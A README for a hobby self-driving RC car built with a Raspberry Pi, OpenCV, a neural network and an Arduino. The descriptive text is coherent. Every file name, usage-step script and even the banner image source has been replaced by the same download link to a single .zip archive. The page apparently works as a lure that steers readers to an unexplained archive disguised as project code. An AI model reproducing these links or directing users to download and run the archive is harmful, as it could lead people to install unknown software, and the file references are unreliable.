# Self Driving RC Car
<br/><br/>
<a href="https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip" target="_blank">
<img src="https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip" width="480" border="10" />
</a>
<br/><br/>
A scaled down version of self-driving system using Neural Networks and OpenCV. The system comprises of - 
* Raspberry Pi with a camera and an ultrasonic sensor as inputs,
* Server that handles:
  * Steering using NN predictions
  * Stop sign and traffic light detection using Haar feature based Cascade Classifiers
  * Distance measurement through monocular vision
  * Front collision avoidance using ultrasonic sensor
* RC Car, and, 
* an Arduino board for RC car control

### Dependencies
* Server
  * OpenCV ver3.2+
  * Pygame
  * NumPy
  * PiSerial
* RaspberryPi
  * PiCamera
* Arduino
* RC Car

### Project structure
* https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip An arduino sketch that acts as a middleware between the RC controller and the server. It allows the user to send commands to drive the car via USB serial interface
* rpi/
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip transmits the distance measuerment taken by the ultrasonic sensor over a TCP/IP socket to the server
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip streams the captures JPEG video frames over a TCP/IP socket to the server
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip contains Utility function
* server/
  * cascade_classifiers/
    * contains the trained Haar-feature based Cascade Classifier xml files
  * collected_images/
    * Images captured during the data set collection phase
  * data_set/
    * Data set for training and testing the Neural Network. Stored in .npz format
  * mlp_xml/
    * Trained MLP_ANN paramters in an XML file
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip a multi-threaded server program that captures the video frames and distance measurements streamed from the RPi, steers the car using the predictions from the NN, and provides stop sign and traffic light detection and front collision avoidance capabilities.
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip Receives the streamed video frames and labels them based on the user input for NN training
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip Neural network training using OpenCV
* test/
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip script to test streaming of distance data from RPi to server
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip script to test streaming of video frames from RPi to server
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip tests RC car control with keyboard
* utils/
  * https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip contains utility functions

### Usage
* Flash Arduino: Flash the Arduino with the *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip* sketch. For testing purposes, run *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip* to drive the RC car with the keyboard

* Collect data set (for NN training and testing purposes): First run *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip* on the server and then run *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip* on the RPi. Use the arrow keys on the keybaord to drive the car around a track. The frames are saved only when there is a key press action. When finished driving, press “q” to exit. The data will saved in a npz file under *data_set* folder.

* Neural network training: Next, run *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip*. The NN training duration can vary depending upon the model hyperparameters chosen. Once the training is complete, the network accuracy on the training and test set will be displayed. Following this, the network weights/parameters will be saved in a xml file under *mlp_xml*.

* Pi Camera calibration: Take multiple chess board images using the RPi camera at various angles and put them into the *chess_board* folder. Then, run *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip*. It will return the camera matrix which should be entered into *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip*. This matrix will be used for distance measurement by the car while its self driving.

* Self-driving in action: First run *https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip* to start the server and then run “https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip” and “https://raw.githubusercontent.com/raineislam/pi-car-sever-client/master/arduino/rc_driver/sever-car-pi-client-v2.5.zip” on raspberry pi.

Thanks alot to @hamuchiwa for the inspiration.
